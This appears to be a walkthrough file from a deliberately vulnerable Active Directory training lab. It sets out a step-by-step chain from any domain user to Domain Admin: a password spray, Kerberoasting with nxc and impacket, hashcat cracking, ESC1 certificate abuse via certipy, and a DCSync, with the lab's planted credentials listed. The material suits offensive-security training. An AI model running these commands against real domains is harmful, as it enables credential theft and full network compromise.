# 02 — Any domain user → Kerberoast → Domain Admin

**Start:** any valid credential (cracked user, `MANDALORE$`, or spray hit).
**Goal:** crack a service-account password, then escalate to DA.
**Why it works:** any authenticated user can request a service ticket (TGS) for
any account with an SPN. The TGS is encrypted with the service account's
password hash — crack it offline. The lab plants weak passwords on these.

---

## Step 1 — Get a low-priv credential (if you have none)

Password spray — 7 seeded users share one password:
```bash
printf '%s\n' biggs.darklighter mon.mothma greedo.tets mace.windu \
  jabba.hutt wilhuff.tarkin jyn.erso > users.txt
nxc smb 10.10.0.10 -u users.txt -p 'SithLord123!' --continue-on-success
```

## Step 2 — Roast every SPN

```bash
nxc ldap 10.10.0.10 -u <user> -p <pw> --kerberoasting kroast.txt
# or impacket:
impacket-GetUserSPNs -request -dc-ip 10.10.0.10 empire.local/<user>:<pw> -outputfile kroast.txt
```

Seeded roastable accounts and their planted passwords:

| Account | SPN | Password |
|---|---|---|
| `svc_trooper` | `HTTP/print.empire.local` | `Summer2024` |
| `svc_maul` | `MSSQLSvc/kamino.empire.local:1433` | `DeathStar1!` |
| `svc_sidious` | (SPN set) | `Tarkin123` |

(RC4-only enctype is forced on these → faster cracking.)

## Step 3 — Crack offline

```bash
hashcat -m 13100 kroast.txt /usr/share/wordlists/rockyou.txt
```
All three fall to rockyou quickly.

## Step 4 — Escalate the cracked account to DA

A cracked service account rarely *is* DA — use it to pivot:

- **`svc_trooper`** → has **constrained delegation** to `HTTP/tatooine.empire.local`
  → impersonate Administrator to that host. See `07-delegation.md`.
- **Any cracked user** → enrol the vulnerable cert template for a DA cert:
  ```bash
  certipy req -u svc_trooper@empire.local -p 'Summer2024' \
    -ca corp-CA -target endor.empire.local \
    -template EMPIREUserESC1 -upn administrator@empire.local
  certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
  ```
  → Administrator NT hash. See `05-adcs-esc1-esc8.md` for full detail.
- **`svc_maul`** → `MSSQLSvc` on kamino → if MSSQL trusts it, `xp_cmdshell` on the
  SQL host, then local→domain escalation.

## Step 5 — DCSync once you hold a DA-equivalent

```bash
impacket-secretsdump -k -just-dc empire.local/administrator@coruscant.empire.local
```
→ krbtgt hash → golden ticket (`12-persistence.md`).

---

**Outcome:** DA in `empire.local`. **Next:** `08-child-eu-to-enterprise-admin.md`.
